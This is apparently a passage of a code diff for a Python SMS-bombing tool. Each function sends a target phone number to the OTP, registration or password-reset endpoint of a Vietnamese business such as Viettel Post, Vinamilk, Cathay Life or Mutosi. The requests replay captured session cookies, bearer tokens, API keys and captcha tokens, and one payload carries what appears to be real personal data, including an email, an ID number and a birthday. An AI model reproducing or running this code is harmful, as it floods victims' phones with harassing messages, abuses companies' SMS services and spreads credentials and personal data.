+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
+    'x-requested-with': 'XMLHttpRequest',
+}
+
+    data = {
+    'action_type': '1',
+    'tel': phone,
+}
+
+    response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data);hoanthanh("hoang-phuc", phone)
+def fm(phone):
+    headers = {
+    'accept': 'application/json, text/plain, */*',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'authorization': 'Bearer',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json;charset=UTF-8',
+    'origin': 'https://fm.com.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://fm.com.vn/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
+    'x-emp': '',
+    'x-fromweb': 'true',
+    'x-requestid': '9a563626-1886-40ce-a5b2-99971fd53161',
+}
+
+    json_data = {
+    'Phone': phone,
+    'LatOfMap': '106',
+    'LongOfMap': '108',
+    'Browser': '',
+}
+
+    response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data);hoanthanh("fmplus", phone)
+def vtpost(phone):
+    cookies = {
+    '_gid': 'GA1.2.620335128.1720627303',
+    '_gat_gtag_UA_128396571_2': '1',
+    'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
+    '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY',
+    '_ga_9NGCREH08E': 'GS1.1.1720627303.1.0.1720627304.59.0.0',
+    '_gat_gtag_UA_146347905_1': '1',
+    '_gat_gtag_UA_142538724_1': '1',
+    '_ga_7RZCEBC0S6': 'GS1.1.1720627304.1.1.1720627306.0.0.0',
+    '_ga_WN26X24M50': 'GS1.1.1720627305.1.1.1720627306.0.0.0',
+    '_ga': 'GA1.1.278441667.1720627303',
+    '_ga_P86KBF64TN': 'GS1.1.1720627305.1.1.1720627319.0.0.0',
+}
+
+    headers = {
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    # 'Cookie': '_gid=GA1.2.620335128.1720627303; _gat_gtag_UA_128396571_2=1; QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv_KN5bT4QKXiMPZaUMqRiF_EEbvz-ub2OfOxFsWqfP5oyWQZfbAj-YmrKoW5q2we2B85fBpeffjr6w1vgncGlK11bclPhcrNb-yY6eMuSkQFZ887kHXkBgVaHZVnb06mjY; _ga_9NGCREH08E=GS1.1.1720627303.1.0.1720627304.59.0.0; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1720627304.1.1.1720627306.0.0.0; _ga_WN26X24M50=GS1.1.1720627305.1.1.1720627306.0.0.0; _ga=GA1.1.278441667.1720627303; _ga_P86KBF64TN=GS1.1.1720627305.1.1.1720627319.0.0.0',
+    'Origin': 'null',
+    'Pragma': 'no-cache',
+    'Sec-Fetch-Dest': 'document',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-User': '?1',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+}
+
+    data = {
+    'FormRegister.FullName': 'Taylor Jasmine',
+    'FormRegister.Phone': phone,
+    'FormRegister.Password': 'vjyy1234',
+    'FormRegister.ConfirmPassword': 'vjyy1234',
+    'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=s7oqj3gkapi06ddxfymrhcs',
+    'ConfirmOtpType': 'Register',
+    'FormRegister.IsRegisterFromPhone': 'true',
+    '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8MNiql6Angxj2aQkKc6E7R0IbTO0WlQgNkTmu1FXJfLeYLf3huG-7Bwm56zhIf_24enfQeQw_ZU0U3j7lUGSruoA3rf6J9q21R09mQjT1SH5SlPYbamWpErWJe9T5YsuQ',
+}
+
+    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data);hoanthanh("viettelpost", phone)
+def shine(phone):
+    headers = {
+    'accept': 'application/json',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'authorization': '',
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+    'origin': 'https://30shine.com',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://30shine.com/',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    json_data = {
+    'phone': phone,
+}
+
+    response = requests.post(
+    'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
+    headers=headers,
+    json=json_data,
+);hoanthanh("ls6trhs5kh", phone)
+def dkimu(phone):
+    headers = {
+    'Accept': 'application/json, text/plain, */*',
+    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/json',
+    'Origin': 'https://mutosi.com',
+    'Pragma': 'no-cache',
+    'Referer': 'https://mutosi.com/',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-site',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+}
+
+    json_data = {
+    'name': 'hà khải',
+    'phone': phone,
+    'password': 'Vjyy1234@',
+    'confirm_password': 'Vjyy1234@',
+    'firstname': None,
+    'lastname': None,
+    'verify_otp': 0,
+    'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
+    'email': 'dđ@gmail.com',
+    'birthday': '2006-02-13',
+    'accept_the_terms': 1,
+    'receive_promotion': 1,
+}
+
+    response = requests.post('https://api-omni.mutosi.com/client/auth/register', headers=headers, json=json_data);hoanthanh("mutosi", phone)
+def otpmu(phone):
+    headers = {
+    'Accept': 'application/json, text/plain, */*',
+    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/json',
+    'Origin': 'https://mutosi.com',
+    'Pragma': 'no-cache',
+    'Referer': 'https://mutosi.com/',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-site',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+}
+
+    json_data = {
+    'phone': phone,
+    'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
+    'source': 'web_consumers',
+}
+
+    response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data);hoanthanh("mutosi", phone)
+def cathay(phone):
+    cookies = {
+    'JSESSIONID': 'u2hdrUGJED2stIM8swVv869b.06283f0e-f7d1-36ef-bc27-6779aba32e74',
+    'TS01f67c5d': '0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598',
+    'BIGipServerB2C_http': '!zsGhGGj3s8sTbk4R4wuMnLjIghcvhuqi/7WpJSvUzgE9Sc3xf70c/K1xMYAaa5MS3Ic/svEyImCoUg==',
+    'TS0173f952': '0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598',
+    '_ga': 'GA1.3.1657492692.1720889869',
+    '_gid': 'GA1.3.636332226.1720889871',
+    'INITSESSIONID': '3f1d8cc9b54babdfc46573d45f59224f',
+    '_ga_M0ZP5CJBQZ': 'GS1.1.1720889868.1.0.1720889887.0.0.0',
+}
+
+    headers = {
+    'Accept': 'application/json, text/javascript, */*; q=0.01',
+    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'Cache-Control': 'no-cache',
+    'Connection': 'keep-alive',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'Cookie': 'JSESSIONID=u2hdrUGJED2stIM8swVv869b.06283f0e-f7d1-36ef-bc27-6779aba32e74; TS01f67c5d=0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598; BIGipServerB2C_http=!zsGhGGj3s8sTbk4R4wuMnLjIghcvhuqi/7WpJSvUzgE9Sc3xf70c/K1xMYAaa5MS3Ic/svEyImCoUg==; TS0173f952=0110512fd710ada119e103677eeb3323b3f9f6d76d703659f4f9cec6727f9fee620c26622e56af64415bb05bfe185fdead4be1a598; _ga=GA1.3.1657492692.1720889869; _gid=GA1.3.636332226.1720889871; INITSESSIONID=3f1d8cc9b54babdfc46573d45f59224f; _ga_M0ZP5CJBQZ=GS1.1.1720889868.1.0.1720889887.0.0.0',
+    'Origin': 'https://www.cathaylife.com.vn',
+    'Pragma': 'no-cache',
+    'Referer': 'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'X-Requested-With': 'XMLHttpRequest',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+}
+
+    data = {
+    'memberMap': '{"userName":"trongkhai611@gmail.com","password":"ditmetzk","birthday":"19/07/1988","certificateNumber":"001088647384","phone":"' + phone + '","email":"trongkhai611@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"NGUYỄN HUY HOÀNG"}',
+    'OTP_TYPE': 'P',
+    'LANGS': 'vi_VN',
+}
+
+
+    response = requests.post(
+    'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
+    cookies=cookies,
+    headers=headers,
+    data=data,
+);hoanthanh("cathaylife", phone)
+def vina(phone):
+    cookies = {
+    '_gcl_au': '1.1.998139933.1720624574',
+    '_ga': 'GA1.1.50287730.1720624578',
+    '_fbp': 'fb.2.1720624579398.521085014509551541',
+    '_tt_enable_cookie': '1',
+    '_ttp': 'KSqjH4dgnlCZCXFrW8iH9-PBbVv',
+    '_gcl_gs': '2.1.k1$i1720624593',
+    '_gcl_aw': 'GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE',
+    '_hjSessionUser_2067180': 'eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==',
+    'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa',
+    '_hjSession_2067180': 'eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
+    '_clck': '1sxln5m%7C2%7Cfni%7C0%7C1652',
+    '__cf_bm': 'lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA',
+    'builderSessionId': '7b564e5635c64aa4b60d611b650e05b4',
+    'sca_fg_codes': '[]',
+    'avadaIsLogin': '',
+    '_ga_6NH1HJ4MRS': 'GS1.1.1721111594.2.1.1721111671.44.0.0',
+    '_clsk': '1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
+}
+
+    headers = {
+    'accept': '*/*',
+    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+    'authorization': 'Bearer null',
+    'cache-control': 'no-cache',
+    'content-type': 'text/plain;charset=UTF-8',
+    # 'cookie': '_gcl_au=1.1.998139933.1720624574; _ga=GA1.1.50287730.1720624578; _fbp=fb.2.1720624579398.521085014509551541; _tt_enable_cookie=1; _ttp=KSqjH4dgnlCZCXFrW8iH9-PBbVv; _gcl_gs=2.1.k1$i1720624593; _gcl_aw=GCL.1720624597.CjwKCAjw4ri0BhAvEiwA8oo6F2TkUVdatYI4tVOobGswn40OdeGgXIg6LXx5FNTWp7uUoRTyudcm1hoCI04QAvD_BwE; _hjSessionUser_2067180=eyJpZCI6IjdhM2IwZGI1LTAyYzUtNTk0YS1hYWIxLTUxNGFhMjEzYmMwNyIsImNyZWF0ZWQiOjE3MjA2MjQ1Nzk1NjAsImV4aXN0aW5nIjp0cnVlfQ==; ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%223d8858bedb9f88174683e7216ae7f4de%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A111%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721111592%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D5be85c0c1450958dd4ed204579b830aa; _hjSession_2067180=eyJpZCI6IjJiMDkwNzRmLTA2M2YtNDNkOC1hYzljLTk1ZTM4MDU3ODA5NSIsImMiOjE3MjExMTE1OTU0NzgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; _clck=1sxln5m%7C2%7Cfni%7C0%7C1652; __cf_bm=lBreB9n2Kjxr5GDN12Z6cP1PU2TCNww1w8ccXp5bzus-1721111653-1.0.1.1-tG3rISwY9rhAXjyBqH8rYZTCWOA9POhBSf1D0X0bFyRdMUnR9K7cmCgu05Xxiho3.bxM00TNCyc6lQ8OcpEhcA; builderSessionId=7b564e5635c64aa4b60d611b650e05b4; sca_fg_codes=[]; avadaIsLogin=; _ga_6NH1HJ4MRS=GS1.1.1721111594.2.1.1721111671.44.0.0; _clsk=1q6ggsm%7C1721111672278%7C4%7C1%7Cv.clarity.ms%2Fcollect',
+    'origin': 'https://new.vinamilk.com.vn',
+    'pragma': 'no-cache',
+    'priority': 'u=1, i',
+    'referer': 'https://new.vinamilk.com.vn/account/register',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+}
+
+    data = '{"type":"register","phone":"' + phone + '"}'
+
+    response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data);hoanthanh("vinamilk", phone)
+def air(phone):
+    referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={phone}'
+    
+    cookies = {
+        '_gcl_au': '1.1.515899722.1720625176',
+        '_tt_enable_cookie': '1',
+        '_ttp': 't-FL-whNfDCNGHd27aF7syOqRSh',
+        '_fbp': 'fb.2.1720625180842.882992170348492798',
+        '__zi': '3000.SSZzejyD3jSkdkgYo5SCqJ6U_wE7LLZFVv3duDj7Kj1jqlNsoWH8boBGzBYF0KELBTUwk8y31v8gtBUuYWuBa0.1',
+        '_gid': 'GA1.3.1511312052.1721112193',
+        '_clck': '1eg7brl%7C2%7Cfni%7C0%7C1652',
+        '_ga': 'GA1.1.186819165.1720625180',
+        '_ga_R4WM78RL0C': 'GS1.1.1721112192.2.1.1721112216.36.0.0',
+    }
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
+        'cache-control': 'no-cache',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'origin': 'https://vietair.com.vn',
+        'pragma': 'no-cache',
+        'priority': 'u=1, i',
+        'referer': referer_url,
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
         'x-requested-with': 'XMLHttpRequest',
     }
 
     data = {
-        'phone': phone,
-        'token': '03AL8dmw-olofZxzuAeuXxDdXsmyMgy6BfZMVUHf7xK_ldn11WRQ_Ni75LkYaBB2vD6rLahRgFlLdMPgGotfuclQC9lLta0nvH0h6u6LEW6HPHU5OnCPJ04S-LVh0aPxwVHlWrJOxmNdUT6P0k1R5yWtjRvp3s60NX0RZSZKFDbXYnr766alQsbLv17M_942ilwyQkv8tBP00HCjU41Hwm8oXlUYqIdVCrw7sHASCV5rlFJ0HksjIY6UX9KpFLNQfL7qmF5fTge43suFmWRhLRrKqOPTT3HwClFqSlvxn09LONUr6ntGuI82aB2okl0J18FBmhWqDZpHlhLgfLyxRq7l0Cd09GbaAZ8-RfQJ2Dc2BpLJkmCupzA-xDM_dtKicThuzA8-2Rg5FyvnSESGMtBnklPAsKfdOZTjJ4HQWhmwCBUqksS8wQuKXsGxNTnZM4LwF5eS08pp6rJFEsPMhYUgpNuKMc0il9L7Ue0bbBLvEjhusIq62MGv3TZTmpvAklikuiXrquHXYCcOb7tBqYdvTPNsR3iNWmi5y7vEsgBfY5SrZ_2R_Bq4nviqDRuB4G2jV8_9DUxp0x',
+        'op': 'PACKAGE_HTTP_POST',
+        'path_ajax_post': '/service03/sms/get',
+        'package_name': 'PK_FD_SMS_OTP',
+        'object_name': 'INS',
+        'P_MOBILE': phone,
+        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
     }
 
-    response = requests.post('https://www.nhaphang247.com/site/get-code', cookies=cookies, headers=headers, data=data, timeout=30, verify=False)
-def sms40(phone):
-  headers = {
-    'Host': 'ubofood.com',
-    'Connection': 'keep-alive',
-    # 'Content-Length': '54',
-    'Accept': 'application/json, text/plain, */*',
-    'Cache-Control': 'no-cache',
-    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
-    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'Origin': 'https://ubofood.com',
-    'X-Requested-With': 'mark.via.gp',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Dest': 'empty',
-    'Referer': 'https://ubofood.com/register',
-    # 'Accept-Encoding': 'gzip, deflate, br',
-    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
-    # 'Cookie': '_gcl_au=1.1.1893195422.1691887985; _ga=GA1.1.920343154.1691887985; _tt_enable_cookie=1; _ttp=W3eMdboFrsZyxJg3xa7ZNN35ySW; _fbp=fb.1.1691887986713.850575362; ubo_trade=%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22760%22%2C%22name%22%3A%22Qu%E1%BA%ADn%201%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2226740%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9%22%7D%2C%22text%22%3A%2206%20Th%C3%A1i%20V%C4%83n%20Lung%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.778755%2C%22lng%22%3A106.70528%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-06-15T03%3A15%3A26.154Z%22%2C%22updated_by%22%3A%22anhltt%22%2C%22default_pos_code%22%3A%22379760001%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU; 